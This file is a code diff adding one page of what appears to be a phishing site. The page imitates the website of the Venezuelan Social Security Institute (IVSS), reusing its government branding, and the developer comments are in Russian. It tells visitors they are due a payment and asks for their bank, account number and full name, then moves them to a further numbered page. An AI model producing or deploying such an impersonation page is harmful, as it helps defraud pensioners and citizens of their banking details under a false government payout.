@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <!-- ============================================================ -->
+    <!-- МЕТАДАННЫЕ СТРАНИЦЫ                                          -->
+    <!-- ============================================================ -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IVSS - Datos Bancarios</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- ============================================================ -->
+    <!-- ШАПКА (HEADER) - ОДИНАКОВАЯ НА ВСЕХ СТРАНИЦАХ               -->
+    <!-- ============================================================ -->
+    <header>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background: #f5f5f5;
+    }
+
+    .gov-header {
+      display: flex;
+      align-items: center;
+      padding: 12px 24px;
+      background: #fff;
+      border-bottom: 1px solid #e0e0e0;
+      gap: 0;
+      flex-wrap: wrap;
+    }
+
+    .gov-header__logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      flex-shrink: 0;
+    }
+
+    .gov-header__logo img {
+      height: 52px;
+      width: auto;
+      display: block;
+    }
+
+    .gov-header__logo-text {
+      display: flex;
+      flex-direction: column;
+      line-height: 1.15;
+    }
+
+    .gov-header__logo-text .line1 {
+      font-size: 15px;
+      color: #888;
+      font-weight: 400;
+      letter-spacing: 0.3px;
+    }
+
+    .gov-header__logo-text .line2 {
+      font-size: 20px;
+      color: #333;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+    }
+
+    .gov-header__logo-text .line3 {
+      font-size: 15px;
+      color: #888;
+      font-weight: 400;
+      letter-spacing: 0.3px;
+    }
+
+    .gov-header__divider {
+      width: 1px;
+      height: 42px;
+      background: #ccc;
+      margin: 0 18px;
+      flex-shrink: 0;
+    }
+
+    .gov-header__ministry {
+      display: flex;
+      flex-direction: column;
+      line-height: 1.25;
+      flex-shrink: 0;
+    }
+
+    .gov-header__ministry .line1 {
+      font-size: 13px;
+      color: #777;
+      font-weight: 400;
+    }
+
+    .gov-header__ministry .line2 {
+      font-size: 13px;
+      color: #777;
+      font-weight: 400;
+    }
+
+    .gov-header__ministry .line2 strong {
+      color: #333;
+      font-weight: 700;
+    }
+
+    .gov-header__institute {
+      display: flex;
+      flex-direction: column;
+      line-height: 1.25;
+      flex-shrink: 0;
+    }
+
+    .gov-header__institute .line1 {
+      font-size: 13px;
+      color: #777;
+      font-weight: 400;
+    }
+
+    .gov-header__institute .line2 {
+      font-size: 13px;
+      color: #333;
+      font-weight: 700;
+    }
+
+    .gov-header__institute .line2 span {
+      color: #777;
+      font-weight: 400;
+    }
+
+    /* ========== MOBILE — только лого + институт ========== */
+    @media (max-width: 767px) {
+      .gov-header {
+        padding: 10px 16px;
+        gap: 12px;
+        flex-wrap: nowrap;
+      }
+
+      .gov-header__logo img {
+        height: 44px;
+      }
+
+      /* Скрываем всё лишнее */
+      .gov-header__logo-text,
+      .gov-header__ministry,
+      .gov-header__divider {
+        display: none !important;
+      }
+
+      /* Показываем и стилизуем институт */
+      .gov-header__institute {
+        display: flex !important;
+      }
+
+      .gov-header__institute .line1 {
+        font-size: 12px;
+        color: #777;
+      }
+
+      .gov-header__institute .line2 {
+        font-size: 15px;
+        color: #333;
+        font-weight: 700;
+      }
+
+      .gov-header__institute .line2 span {
+        color: #777;
+        font-weight: 400;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <header class="gov-header">
+    <div class="gov-header__logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/f/f3/Pol%C3%ADtica_de_Venezuela.png" alt="Gobierno Bolivariano de Venezuela">
+    </div>
+
+    <div class="gov-header__divider"></div>
+
+    <div class="gov-header__ministry">
+      <span class="line1">Ministerio del Poder Popular</span>
+      <span class="line2">para el <strong>Proceso Social de Trabajo</strong></span>
+    </div>
+
+    <div class="gov-header__divider"></div>
+
+    <div class="gov-header__institute">
+      <span class="line1">Instituto Venezolano</span>
+      <span class="line2">de los <span>Seguros Sociales</span></span>
+    </div>
+  </header>
+        <div class="header-main">
+            <div class="container">
+                <div class="logo-area">
+                    <div class="logo-circle"></div>
+                    <div class="logo-text">
+                        <h1>IVSS</h1>
+                        <p>Instituto Venezolano de los Seguros Sociales</p>
+                    </div>
+                </div>
+                <div class="header-right">
+                    <div class="search-box">
+                        <input type="text" placeholder="Buscar" aria-label="Buscar">
+                        <button type="button" aria-label="Buscar">&#128269;</button>
+                    </div>
+                    <div class="social-icons">
+                        <a href="#" aria-label="Twitter">&#120143;</a>
+                        <a href="#" aria-label="Facebook">&#120144;</a>
+                        <a href="#" aria-label="Instagram">&#120145;</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <nav class="nav-menu">
+            <div class="container">
+                <ul>
+                    <li><a href="#">Inicio</a></li>
+                    <li><a href="#">IVSS</a></li>
+                    <li><a href="#">Ciudadanos</a></li>
+                    <li><a href="#">Empleadores</a></li>
+                    <li><a href="#">Pensionados</a></li>
+                    <li><a href="#">Localización</a></li>
+                    <li><a href="#">Noticias</a></li>
+                </ul>
+            </div>
+        </nav>
+    </header>
+    <!-- ==================== КОНЕЦ ШАПКИ ==================== -->
+
+
+    <!-- ============================================================ -->
+    <!-- ОСНОВНОЕ СОДЕРЖИМОЕ: ФОРМА БАНКОВСКИХ ДАННЫХ                 -->
+    <!-- ============================================================ -->
+    <main>
+        <!-- Секция с тёмным фоном как на странице логина -->
+        <section class="login-section">
+            <div class="bank-card">
+                <!-- Заголовок страницы -->
+                <h2>&#161;Todo Listo, Felicidades&#33;</h2>
+                <p class="subtitle" style="margin-bottom: 25px;">
+                    Para recibir su pago, por favor complete los datos bancarios a continuación.
+                </p>
+
+                <!-- Форма банковских данных -->
+                <form onsubmit="event.preventDefault(); window.location.href='index5.html';">
+                    <!-- Поле: Выбор банка -->
+                    <div class="form-group">
+                        <label for="bankSelect">Seleccionar banco</label>
+                        <select id="bankSelect" name="bankSelect" required>
+                            <!-- Первый пустой пункт - заглушка -->
+                            <option value="">-- Seleccione su banco --</option>
+                            <!-- ====== СПИСОК БАНКОВ - можно добавлять/менять ====== -->
+                            <option value="banco-venezuela">Banco de Venezuela</option>
+                            <option value="banesco">Banesco</option>
+                            <option value="bbva">BBVA Provincial</option>
+                            <option value="mercantil">Mercantil</option>
+                            <option value="inass">Cuenta interna de IVSS</option>
+                            <option value="bnc">BNC</option>
+                            <option value="bancamiga">Bancamiga</option>
+                            <option value="bancaribe">Bancaribe</option>
+                            <option value="tesoro">Banco del Tesoro</option>
+                            <option value="bfc">BFC</option>
+                            <option value="exterior">Banco Exterior</option>
+                            <option value="banplus">Banplus</option>
+                            <option value="activo">Banco Activo</option>
+                            <option value="plaza">Banco Plaza</option>
+                            <option value="delsur">DelSur</option>
+                            <option value="caroni">Banco Caron&iacute;</option>
+                            <option value="100-banco">100% Banco</option>
+                            <option value="sofitasa">Banco Sofitasa</option>
+                            <option value="venezolano-credito">Banco Venezolano de Cr&eacute;dito</option>
+                            <option value="zinli">Zinli</option>
+                            <option value="paypal">PayPal</option>
+                            <option value="payoneer">Payoneer</option>
+                            <option value="otro">Otro Banco</option>
+                            <!-- ====== КОНЕЦ СПИСКА БАНКОВ ====== -->
+                        </select>
+                    </div>
+
+                    <!-- Поле: Номер счёта -->
+                    <div class="form-group">
+                        <label for="accountNumber">N&uacute;mero de cuenta</label>
+                        <input
+                            type="text"
+                            id="accountNumber"
+                            name="accountNumber"
+                            placeholder="Ingrese su n&uacute;mero de cuenta"
+                            required
+                        >
+                    </div>
+
+                    <!-- Поле: Полное имя -->
+                    <div class="form-group">
+                        <label for="fullNameBank">Nombre completo</label>
+                        <input
+                            type="text"
+                            id="fullNameBank"
+                            name="fullNameBank"
+                            placeholder="Ingrese su nombre completo"
+                            required
+                        >
+                    </div>
+
+                    <!-- Чекбокс согласия -->
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="agreeCheckbox" name="agreeCheckbox">
+                        <label for="agreeCheckbox">
+                            Confirmo la exactitud de los datos ingresados y acepto su procesamiento de acuerdo con la pol&iacute;tica de privacidad.
+                        </label>
+                    </div>
+
+                    <!-- Кнопка получения выплаты (изначально отключена) -->
+                    <button type="submit" id="submitBankBtn" class="btn-primary" disabled>
+                        Recibir Pago
+                    </button>
+                </form>
+            </div>
+        </section>
+    </main>
+    <!-- ==================== КОНЕЦ ОСНОВНОГО СОДЕРЖИМОГО ==================== -->
+
+
+    <!-- ============================================================ -->
+    <!-- ПОДВАЛ (FOOTER) - ОДИНАКОВЫЙ НА ВСЕХ СТРАНИЦАХ              -->
+    <!-- ============================================================ -->
+    <footer>
+        <!-- Секция "GOBIERNO EN LÍNEA" с логотипами -->
+        <div class="footer-gobierno">
+            <h3>GOBIERNO EN L&Iacute;NEA</h3>
+            <div class="footer-logos">
+                <!-- Логотипы правительственных организаций -->
+                <div class="footer-logo-item logo-gob"></div>
+                <div class="footer-logo-item logo-inces"></div>
+                <div class="footer-logo-item logo-incret"></div>
+                <div class="footer-logo-item logo-inpsasel"></div>
+                <div class="footer-logo-item logo-ivss"></div>
+            </div>
+        </div>
+
+        <!-- Нижняя часть подвала -->
+        <div class="footer-bottom">
+            <h4>LA SEGURIDAD SOCIAL ES TU DERECHO</h4>
+            <p>Instituto Venezolano de los Seguros Sociales (IVSS) 2015</p>
+        </div>
+    </footer>
+    <!-- ==================== КОНЕЦ ПОДВАЛА ==================== -->
+
+    <script src="script.js"></script>
+</body>
+</html>
